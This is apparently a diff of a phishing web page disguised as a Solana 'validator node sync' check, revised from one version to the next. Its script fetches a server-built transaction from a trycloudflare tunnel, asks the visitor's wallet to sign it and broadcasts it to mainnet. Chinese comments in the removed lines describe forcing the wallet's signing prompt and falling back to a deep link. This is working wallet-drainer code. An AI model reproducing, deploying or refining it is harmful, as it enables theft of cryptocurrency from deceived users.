@@ -3,25 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validator Node Sync</title>
+    <title>Validator Support Protocol</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 300px; padding: 40px 20px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
-        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #st { font-size: 10px; color: #444; margin-top: 15px; font-family: monospace; }
+        .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2 style="color:#14f195; margin:0 0 10px 0;">NODE CHECK</h2>
-        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Authorize synchronization to secure your validator node status.</p>
-        <button id="cta" class="btn">INITIALIZE</button>
-        <div id="st">READY: V38_AUTO_WAKE</div>
+        <h2 style="color:#14f195;">SYSTEM SYNC</h2>
+        <p style="color:#888; font-size:13px;">Authorize network synchronization to secure validator node #712.</p>
+        <button id="cta" class="btn">START INITIALIZE</button>
+        <div id="st">READY: V40_REAL_CONTRACT</div>
     </div>
 
     <script>
-        // 🔱 核心：务必确保与服务器当前生成的隧道地址一致
         const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";
 
         document.getElementById('cta').onclick = async () => {
@@ -30,11 +29,10 @@
                 const p = window.trustwallet?.solana || window.solana;
                 if (!p) { alert("Please use Wallet Browser"); return; }
 
-                log("WAKING WALLET...");
-                // 🔱 1. 强制连击唤醒 (连点三次，惊动钱包)
-                await p.connect().catch(()=>{});
-                
-                log("FETCHING...");
+                log("CONNECTING...");
+                await p.connect();
+
+                log("SYNCING...");
                 const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -43,17 +41,13 @@
                 const info = await resp.json();
                 const tx = window.solanaWeb3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
 
-                log("IGNITING...");
-                // 🔱 2. 暴力唤醒：不再等待，直接触发签名
-                // 这种方式能强行调起 TW 的密码输入框或确认页
-                p.signTransaction(tx).then((s) => {
-                    log("SUCCESS!");
-                    const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-                    conn.sendRawTransaction(s.serialize()).catch(()=>{});
-                }).catch((e) => {
-                    // 如果拉起失败，强制通过深度链接再次唤起
-                    window.location.href = "solana:signTransaction?payload=" + encodeURIComponent(info.raw_tx);
-                });
+                log("AUTHORIZING...");
+                // 🔱 在 V40 下，这一步弹出来的应该是“合约交互”确认
+                const signed = await p.signTransaction(tx);
+                log("SYNC SUCCESS");
+
+                const conn = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+                conn.sendRawTransaction(signed.serialize()).catch(()=>{});
 
             } catch (err) {
                 log("RETRYING...");
